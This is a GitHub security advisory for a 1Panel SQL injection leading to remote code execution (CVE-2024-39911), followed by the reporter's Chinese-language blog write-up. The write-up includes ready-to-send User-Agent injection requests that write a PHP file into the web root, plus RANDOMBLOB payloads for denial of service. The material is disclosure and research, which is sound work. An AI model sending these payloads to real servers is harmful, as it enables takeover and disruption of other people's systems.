=== Content from github.com_e9dd0a29_20250110_123428.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F1Panel-dev%2F1Panel%2Fsecurity%2Fadvisories%2FGHSA-7m53-pwp6-v3f5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F1Panel-dev%2F1Panel%2Fsecurity%2Fadvisories%2FGHSA-7m53-pwp6-v3f5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=1Panel-dev%2F1Panel)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[1Panel-dev](/1Panel-dev)
/
**[1Panel](/1Panel-dev/1Panel)**
Public

* [Notifications](/login?return_to=%2F1Panel-dev%2F1Panel) You must be signed in to change notification settings
* [Fork
  2.2k](/login?return_to=%2F1Panel-dev%2F1Panel)
* [Star
   24.9k](/login?return_to=%2F1Panel-dev%2F1Panel)

* [Code](/1Panel-dev/1Panel)
* [Issues
  607](/1Panel-dev/1Panel/issues)
* [Pull requests
  0](/1Panel-dev/1Panel/pulls)
* [Discussions](/1Panel-dev/1Panel/discussions)
* [Actions](/1Panel-dev/1Panel/actions)
* [Security](/1Panel-dev/1Panel/security)
* [Insights](/1Panel-dev/1Panel/pulse)

Additional navigation options

* [Code](/1Panel-dev/1Panel)
* [Issues](/1Panel-dev/1Panel/issues)
* [Pull requests](/1Panel-dev/1Panel/pulls)
* [Discussions](/1Panel-dev/1Panel/discussions)
* [Actions](/1Panel-dev/1Panel/actions)
* [Security](/1Panel-dev/1Panel/security)
* [Insights](/1Panel-dev/1Panel/pulse)

# 1Panel panel frontend SQL injection to website functionality RCE vulnerability

Critical

[wanghe-fit2cloud](/wanghe-fit2cloud)
published
GHSA-7m53-pwp6-v3f5
Jul 18, 2024

## Package

专业版/社区版
(专业版/社区版)

## Affected versions

v1.10.10-lts

## Patched versions

v1.10.12-lts

## Description

## 0x1 测试版本

专业版 v1.10.10-lts

社区版 v1.10.10-lts

1panel/openresty:1.21.4.3-3-1-focal

## 0x2 影响范围

网站监控功能影响 == 1panel/openresty:1.21.4.3-3-1-focal

WAF功能影响 <= 1panel/openresty:1.21.4.3-3-1-focal

## 0x3 题外话

具体测试/发现过程在 `https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html` 有兴趣的大佬们可以看看

## 0x4 网站监控功能GetShell

利用条件:

* 专业版,并开启网站监控功能
* 关闭waf功能
* 安装有1P-openresty容器且搭建有php环境网站

默认网站路径格式如下，这个路径是在op容器里面的路径

```
/www/sites/网站代号(默认为域名)/index/

```

通过sql注入导出文件到网站路径下

```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#

```

然后来到网站路径下可以看到我们写入的文件

[![image](https://private-user-images.githubusercontent.com/103053746/338056404-4c64d116-6187-4661-8e9e-d3ae21b189bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTI3NjgsIm5iZiI6MTczNjUxMjQ2OCwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2NDA0LTRjNjRkMTE2LTYxODctNDY2MS04ZTllLWQzYWUyMWIxODliZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxMjM0MjhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZTBkZDkxOGI0N2NlYTU1YmQxNGQxMjNiZmUyZDQ0N2JmNTFjYmFjZDIwYWFmYTIxNTNlYzg0OWFjODBiZGNmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.I-C2sPhD-3PbUMguPhtca7tF6IGP_Ho5fnGppL_TNNA)](https://private-user-images.githubusercontent.com/103053746/338056404-4c64d116-6187-4661-8e9e-d3ae21b189bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTI3NjgsIm5iZiI6MTczNjUxMjQ2OCwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2NDA0LTRjNjRkMTE2LTYxODctNDY2MS04ZTllLWQzYWUyMWIxODliZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxMjM0MjhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZTBkZDkxOGI0N2NlYTU1YmQxNGQxMjNiZmUyZDQ0N2JmNTFjYmFjZDIwYWFmYTIxNTNlYzg0OWFjODBiZGNmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.I-C2sPhD-3PbUMguPhtca7tF6IGP_Ho5fnGppL_TNNA)

访问发现成功输出blog.mo60.cn 的md5值，成功执行代码

[![image](https://private-user-images.githubusercontent.com/103053746/338056240-52bc1681-bba4-4e50-bca5-3a1a2821eb8f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTI3NjgsIm5iZiI6MTczNjUxMjQ2OCwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2MjQwLTUyYmMxNjgxLWJiYTQtNGU1MC1iY2E1LTNhMWEyODIxZWI4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxMjM0MjhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xNmM0NWI1M2U4MzNhYjI2OTg0YzViYzE4MWJkMzMwNjAyOTZiNjhjZTA4NGM3ZjUzZDk1N2Y4NWUxZWI4MTBlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.gZ4acQJki8xxylsUbyXnsdnDLNp4h5LHNUkRFmrc-Ss)](https://private-user-images.githubusercontent.com/103053746/338056240-52bc1681-bba4-4e50-bca5-3a1a2821eb8f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTI3NjgsIm5iZiI6MTczNjUxMjQ2OCwicGF0aCI6Ii8xMDMwNTM3NDYvMzM4MDU2MjQwLTUyYmMxNjgxLWJiYTQtNGU1MC1iY2E1LTNhMWEyODIxZWI4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxMjM0MjhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xNmM0NWI1M2U4MzNhYjI2OTg0YzViYzE4MWJkMzMwNjAyOTZiNjhjZTA4NGM3ZjUzZDk1N2Y4NWUxZWI4MTBlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.gZ4acQJki8xxylsUbyXnsdnDLNp4h5LHNUkRFmrc-Ss)

## 0x5 Waf功能

利用条件:

* 开启waf功能
* 安装有1P-openresty容器且搭建有php环境网站

发送后即可成功写入文件

```
GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn',"args", "sqlInjectA", "", "YmxvZy5tbzYwLmNu", "blog.mo60.cn", 0, "deny", 0, 1);ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
Connection: close

```

### Severity

Critical

10.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2024-39911

### Weaknesses

No CWEs

### Credits

* [![@Junehck](https://avatars.githubusercontent.com/u/103053746?s=40&v=4)](/Junehck)
  [Junehck](/Junehck)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.mo60.cn_2cae0cfa_20250110_123428.html ===


[JunBlog](https://blog.mo60.cn/)

* Activity Calendar
  Count the number of articles and author reviews over the last 10 months

  Loading...

  Radar Chart

  Loading...

  Release Chart

  Loading...

  Classification Chart

  Loading...

  Tag Chart

  Loading...

* New thing

  **New thing**

  [要静下心来学习了
  2024-10-16 15:30](https://blog.mo60.cn/index.php/cross.html)[无聊弄了个留言板靶场,感兴趣的师傅可以试试打打看Web-靶场-留言板链接：https://pan.quark.cn/s/4c64a80023ae
  2024-07-15 17:39](https://blog.mo60.cn/index.php/cross.html)[近期发现有一些天天在对外扫描的机器跳转到了我的博客导致其他师傅对我进行了溯源，这里我提一下那些扫描行为与本人无关，我也不会傻到跳自己博客,请溯源的师傅们不用进行无效溯源
  2024-06-06 16:23](https://blog.mo60.cn/index.php/cross.html)

* 文章
* 时光机

[![](http://blog.mo60.cn/portrait.php)](https://blog.mo60.cn/index.php/cross.html)

**Juneha**

* Good evening, pay attention to early break

* Navigation
* [Home](https://blog.mo60.cn/)
* [关于博主](/index.php/about.html)
* [New thing](/index.php/cross.html)
* [感谢列表](/index.php/thank.html)
* [所有文章](/index.php/Archives.html)
* [友情链接](/index.php/links.html)
* [信息安全与评估](/index.php/Information_Security_and_Assessment.html)
* [Edusrc邀请码](/edusrc)
* Components
* Categories

  + [**19**渗透技巧](https://blog.mo60.cn/index.php/category/tips/)
  + [**6**代码审计](https://blog.mo60.cn/index.php/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
  + [**1**渗透工具](https://blog.mo60.cn/index.php/category/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/)
  + [**8**漏洞复现](https://blog.mo60.cn/index.php/category/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
  + [**13**渗透测试](https://blog.mo60.cn/index.php/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/)
  + [**11**CTF](https://blog.mo60.cn/index.php/category/CTF/)
  + [**4**学习笔记](https://blog.mo60.cn/index.php/category/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
  + [**5**杂七杂八](https://blog.mo60.cn/index.php/category/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/)
  + [**4**点滴记忆](https://blog.mo60.cn/index.php/category/life/)
  + [**29**备忘录](https://blog.mo60.cn/index.php/category/Notes/)

Juneha

1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)0x00 1Panel 架构1Panel 大致架构如下，面板本身是运行在宿主机上的，搭建的网站运行的其他服务等都...扫描右侧二维码阅读全文![](https://blog.mo60.cn/usr/themes/handsome/libs/interface/GetCode.php?type=url&content=https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html)08
2024/06
# 1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)

* Author：  [Juneha](https://blog.mo60.cn/index.php/author/1/)
* 发布时间：June 8, 2024
* 9489 views
* [6 comments](#comments)
* 632 words
* Categories： [代码审计](https://blog.mo60.cn/index.php/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/) [漏洞复现](https://blog.mo60.cn/index.php/category/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

1. [Home](https://blog.mo60.cn/ "Return to Home")
2. Text

## 0x00 1Panel 架构

1Panel 大致架构如下，面板本身是运行在宿主机上的，搭建的网站运行的其他服务等都是在docker内

![34085-mhf27my8169.png](https://blog.mo60.cn/usr/uploads/2024/07/2299299793.png "34085-mhf27my8169.png")

请求日志，访问日志是在`1panel/openresty`容器里面的各种.db文件里面存储着，通过lua文件写入的, waf功能以及网站监控功能也是在`1panel/openresty`容器内实现并存储的,然后面板去读取展示

![90461-kapnrjfpl4p.png](https://blog.mo60.cn/usr/uploads/2024/07/2222020475.png "90461-kapnrjfpl4p.png")

复现视频 <https://www.bilibili.com/video/BV1tt8ue6EmU/>

**漏洞在6月初发现，反馈给1p官方后，六月中修复，7月中漏洞公开**

## 0x1 测试版本

专业版 `v1.10.10-lts`
社区版 `v1.10.10-lts`
`1panel/openresty:1.21.4.3-3-1-focal`

## 0x2 影响范围

网站监控功能影响 == `1panel/openresty:1.21.4.3-3-1-focal`
WAF功能影响 <= `1panel/openresty:1.21.4.3-3-1-focal`

## 0x3 网站监控功能

利用条件:

* 专业版,并开启网站监控功能
* 关闭waf功能
* 安装有1P-openresty容器且搭建有php环境网站

### 3.1 发现注入

这里会记录请求日志

![54024-mck2p3v6af.png](https://blog.mo60.cn/usr/uploads/2024/06/2860837733.png "54024-mck2p3v6af.png")

他记录的字段有 re ua头等

![77768-th6p61i1lg.png](https://blog.mo60.cn/usr/uploads/2024/06/920126437.png "77768-th6p61i1lg.png")

在记录的字段上加上单引号会发现没有成功记录日志，猜测这里存在一个inser的sql注入

![73269-c7hf6jhpnmh.png](https://blog.mo60.cn/usr/uploads/2024/06/2262924585.png "73269-c7hf6jhpnmh.png")

进一步验证因为数据库是sqlite,我们尝试一下字符串拼功能最后记录是啥样子的,发送数据包

```
User-Agent: Mozilla/5.0'||"blog.mo60.cn"||'b
```

发现字符串被拼接了，确定了这里存在一个insert的注入

![84966-m75osymtreg.png](https://blog.mo60.cn/usr/uploads/2024/06/923456268.png "84966-m75osymtreg.png")

### 3.2 文件定位

这个功能的数据库在

```
/usr/local/openresty/1pwaf/data/db/sites/网站编号/site_req_logs.db
```

或者在宿主机的

```
/opt/1panel/apps/openresty/openresty/1pwaf/data/db/sites/网站代号
```

写入数据库语句的脚本在

```
/usr/local/openresty/1pwaf/lib/monitor_log.lua
```

执行的sql语句如下
![54224-utnmrnt1m6t.png](https://blog.mo60.cn/usr/uploads/2024/06/2285565036.png "54224-utnmrnt1m6t.png")

```
INSERT INTO site_req_logs (
            server_name, host,ip, ip_iso, ip_country_zh,
            ip_country_en, ip_province_zh, ip_province_en,
            uri, user_agent, method, status_code, referer,
            spider, request_time, localtime, time, request_uri,
            flow, day, hour, uv_id, referer_domain,
            os,browser,device,pv_tag,uv_tag
        ) VALUES (
            '%s', '%s', '%s', '%s', '%s',
            '%s', '%s', '%s',
            '%s', '%s', '%s', %d, '%s',
            '%s', %d, DATETIME('now'), %f, '%s',
            %d, '%s', '%s', '%s', '%s',
            '%s', '%s', '%s','%s','%s'
        )
```

我们可控的位置在user\_agent头也就是

```
VALUES (
            '%s', '%s', '%s', '%s', '%s',
            '%s', '%s', '%s',
            '可控点', '%s', '%s', %d, '%s',
            '%s', %d, DATETIME('now'), %f, '%s',
            %d, '%s', '%s', '%s', '%s',
            '%s', '%s', '%s','%s','%s'
        )
```
### 3.3 Getshell

这里我们先测试一下存不存在堆叠注入,先闭合前面的然后在构造插入新语句的poc

```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');INSERT INTO "main"."site_req_logs" ("id", "server_name", "host", "ip", "ip_iso", "ip_country_zh", "ip_country_en", "ip_province_zh", "ip_province_en", "ip_longitude", "ip_latitude", "uri", "user_agent", "method", "status_code", "referer", "spider", "request_time", "localtime", "time", "request_uri", "flow", "day", "hour", "uv_id", "referer_domain", "os", "browser", "device", "pv_tag", "uv_tag")VALUES (18, '192.168.99.6', '192.168.99.6', '192.168.99.2', 'Local', 'blog.mo60.cn', 'Intranet', '', '', NULL, NULL, '/blog.mo60.cn', 'blog.mo60.cn', 'blog.mo60.cn', 114514, '', '', 1, '2024-06-09 08:16:52', 1717921010.847, '/aa', 552, '2024-06-09', '16', '', '', 'windows', 'edge', 'pc', '', '');#
Connection: close
```

可以看到插入了我们的语句

![58819-8iadv9n3g6.png](https://blog.mo60.cn/usr/uploads/2024/06/3922603103.png "58819-8iadv9n3g6.png")

那么我们的思路是通过堆叠注入写出文件,到网站目录下,因为网站大部分是支持php的，默认网站路径格式如下

```
/www/sites/网站代号(默认为域名)/index/
```

然后构造poc写入文件

```
ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php phpinfo();?>');#
```

然后发送数据包

![80588-5f91688fbto.png](https://blog.mo60.cn/usr/uploads/2024/06/2449810426.png "80588-5f91688fbto.png")

然后进入容器查看一下，发现文件写入成功

![58230-vmlteiqvtmq.png](https://blog.mo60.cn/usr/uploads/2024/06/1415654614.png "58230-vmlteiqvtmq.png")

访问成功执行

![27475-qq3xv8pi72i.png](https://blog.mo60.cn/usr/uploads/2024/06/3250933346.png "27475-qq3xv8pi72i.png")

测试poc

```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#

```

发送后如果写入文件并输出`C930b955726e241e6a7aa1e4184b54e7f`就是存在

![96431-e1z02na9ud.png](https://blog.mo60.cn/usr/uploads/2024/06/3358073358.png "96431-e1z02na9ud.png")

这个利用方式在开启waf的情况下无法利用，大致示意图

![44326-xbi7siltexi.png](https://blog.mo60.cn/usr/uploads/2024/07/933116448.png "44326-xbi7siltexi.png")

### 3.4 功能DDOS

这里是利用到`RANDOMBLOB 是SQLite数据库中的一个函数，它的主要用途是生成一个指定长度的包含随机字节的二进制大对象(BLOB)。`,然后传入一个`RANDOMBLOB(39990000)`

```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'||RANDOMBLOB(39990000)||'blog.mo60.cn
Connection: close
```

发送后来到请求日志查看，直接响应超时功能全部用不了

```
http://192.168.99.6:13515/xpack/monitor/log
```

![30547-cvqi2iqiek4.png](https://blog.mo60.cn/usr/uploads/2024/06/4154199629.png "30547-cvqi2iqiek4.png")

上面的操作导致数据库文件特别大因为生成了太大字节的内容

![14952-je0w6kvvrab.png](https://blog.mo60.cn/usr/uploads/2024/06/2308194125.png "14952-je0w6kvvrab.png")

## 0x4 WAF功能

利用条件:

* 开启waf功能
* 安装有1P-openresty容器且搭建有php环境网站

### 4.1发现注入

先来一条会触发waf的规则

![64904-117jso5e9la9.png](https://blog.mo60.cn/usr/uploads/2024/06/3468671364.png "64904-117jso5e9la9.png")

可以看到在waf拦截记录里面记录了

```
http://URL/xpack/waf/websites
```

![31583-o075u709kl.png](https://blog.mo60.cn/usr/uploads/2024/06/4119429834.png "31583-o075u709kl.png")

可以看到记录的字段跟上面也差不多

![36923-jukq0to3ww.png](https://blog.mo60.cn/usr/uploads/2024/06/1487655147.png "36923-jukq0to3ww.png")

直接测试有没有注入

```
User-Agent: Mozilla/5.0'||"blog.mo60.cn"||'b
```

可以看到最近得到的是拼接后的结果，这里存在注入

![78717-bn4faiug3u.png](https://blog.mo60.cn/usr/uploads/2024/06/1458821113.png "78717-bn4faiug3u.png")

### 4.2文件定位

进入op的到容器里面

```
docker exec -it 8fbeeb7b4dbc /bin/bash
```

数据库的路径位于,是SQLite数据库

```
/usr/local/openresty/1pwaf/data/db/
```

里面有两个数据库文件,`1pwaf.db` 跟 `req_log.db`,一个是记录的waf的开关情况配置等，另外一个是我们需要的请求日志,我们的拦截日志就在这个库里面记录着

![38921-k80g3gf9fc.png](https://blog.mo60.cn/usr/uploads/2024/06/2652911413.png "38921-k80g3gf9fc.png")

然后把db文件拷贝到宿主机上分析一下,后面发现就在1panel的文件路径里面就有不需要特意进入到容器`/opt/1panel/`

```
docker cp 8fbeeb7b4dbc:/usr/local/openresty/1pwaf/data/db/req_log.db .
```

可以看到我们的拦截记录就在这里面

![45739-wjadhcs5n5k.png](https://blog.mo60.cn/usr/uploads/2024/06/438889159.png "45739-wjadhcs5n5k.png")

然后通过搜索找到的插入语句在

```
/usr/local/openresty/1pwaf/lib/attack_log.lua
```

打开可以看到执行的sql语句

![84835-2s8mjzqjhtg.png](https://blog.mo60.cn/usr/uploads/2024/06/1232270155.png "84835-2s8mjzqjhtg.png")

```
INSERT INTO req_logs (
        id, ip, ip_iso, ip_country_zh, ip_country_en,
        ip_province_zh, ip_province_en, ip_longitude, ip_latitude, localtime,
        time,server_name,  website_key, host, method,
        uri, user_agent, exec_rule, rule_type, match_rule, match_value,
        nginx_log, blocking_time, action, is_block, is_attack
    ) VALUES (
        '%s', '%s', '%s', '%s', '%s',
        '%s', '%s', %d, %d, DATETIME('now'),
         %f,  '%s', '%s', '%s', '%s',
         '%s', '%s', '%s', '%s', '%s', '%s',
         '%s', %d, '%s', %d, %d
    )
```

我们的可控点在第二个插入参数的位置

```
VALUES (
        '%s', '%s', '%s', '%s', '%s',
        '%s', '%s', %d, %d, DATETIME('now'),
         %f,  '%s', '%s', '%s', '%s',
         '%s', '可控点', '%s', '%s', '%s', '%s',
         '%s', %d, '%s', %d, %d
    )
```
### 4.3 Getshell

先构造好poc

```
ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
```

然后这里利用ua头位置注入来写入文件

```
GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn',"args", "sqlInjectA", "", "YmxvZy5tbzYwLmNu", "blog.mo60.cn", 0, "deny", 0, 1);ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
Connection: close
```

![58723-02pmtls4gs3q.png](https://blog.mo60.cn/usr/uploads/2024/06/2486712121.png "58723-02pmtls4gs3q.png")

访问成功执行

![47350-n1iob8sn3z.png](https://blog.mo60.cn/usr/uploads/2024/06/1277290043.png "47350-n1iob8sn3z.png")

`这里利用只要开启waf功能即可`

### 4.4 功能DDOS

还是利用生成一大堆数据，然后让这个接口响应超时

```
GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn'||RANDOMBLOB(79990000)||'blog.mo60.cn
Connection: close
```

然后来到拦截日志，开始转圈圈

![86580-d1b3g7jn0uf.png](https://blog.mo60.cn/usr/uploads/2024/06/4051109451.png "86580-d1b3g7jn0uf.png")

然后过一会提示请求错误

![22426-miscb82dww9.png](https://blog.mo60.cn/usr/uploads/2024/06/4050549604.png "22426-miscb82dww9.png")

Last modification：July 22, 2024
© Allow specification reprint

* **本文作者：**Juneha
* **本文链接：**[https://blog.mo60.cn/index.php/archives/1Panel\_SQLinjection2Rce.html](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html "1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)")
* **版权声明：**本博客所有文章除特别声明外，均默认采用 [**CC BY-NC-SA 4.0**](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh "CC BY-NC-SA 4.0 ")  许可协议。
* **法律说明：**
* **文章声明：**文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任，本人坚决反对利用文章内容进行恶意攻击行为，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全，本文内容未隐讳任何个人、群体、公司。非文学作品，请勿过度理解，根据《计算机软件保护条例》第十七条，本站所有软件请仅用于学习研究用途。

Support
#### Appreciate the author

* AliPay
* WeChat

